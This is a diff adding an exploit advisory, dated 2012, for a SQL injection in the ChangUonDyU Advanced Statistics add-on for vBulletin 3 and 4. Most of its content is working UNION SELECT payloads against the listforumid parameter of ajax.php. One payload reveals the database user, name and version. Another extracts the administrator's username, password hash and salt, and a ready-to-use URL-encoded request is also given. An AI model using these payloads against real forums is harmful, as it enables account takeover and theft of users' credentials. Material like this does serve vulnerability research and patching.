@@ -1,0 +1,51 @@
+# Exploit Title: vBulletin ChangUonDyU Advanced Statistics - SQL Injection
+Vulnerability
+# Google Dork: No Dork
+# Date: 19/10/2012
+# Exploit Author: Juno_okyo
+# Vendor Homepage: http://hoiquantinhoc.com
+# Software Link:
+http://hoiquantinhoc.com/modifications-3-8-x/4468-changuondyu-advanced-statistics-6-0-1-a.html
+# Version: vBulletin 3 & 4
+# Tested on: Windows 7
+# CVE : http://www.vbulletin.com/
+#
+##############################################################################################
+Vulnerability:
+##############################################################################################
+
+SQL Injection was found in ChangUonDyU Advanced Statistics.
+
+Query on ajax.php
+
+##############################################################################################
+Exploitation:
+##############################################################################################
+
+ajax.php?do=inforum&listforumid=100) UNION SELECT
+1,concat_ws(0x7c,user(),database(),version()),3,4,5,6,7,8,9,10-- -&result=20
+
+or:
+
+ajax.php?do=inforum&listforumid=100) UNION SELECT
+1,2,3,4,5,6,concat_ws(0x7c,username,password,salt),8,9,10,11 from user
+where userid=1-- -&result=20
+
+##############################################################################################
+Ex:
+##############################################################################################
+
+http://server/f/ajax.php?do=inforum&listforumid=100%29%20UNION%20SELECT%201,concat_ws%280x7c,user%28%29,database%28%29,version%28%29%29,3,4,5,6,7,8,9,10--%20-&result=20
+
+
+##############################################################################################
+More Details:
+##############################################################################################
+
+Website: http://junookyo.blogspot.com/
+About Exploit:
+http://junookyo.blogspot.com/2012/10/vbb-changuondyu-advanced-statistics-sql.html
+
+##############################################################################################
+Great thanks to James, Juno_okyo & J2TeaM, VNHack Group
+##############################################################################################
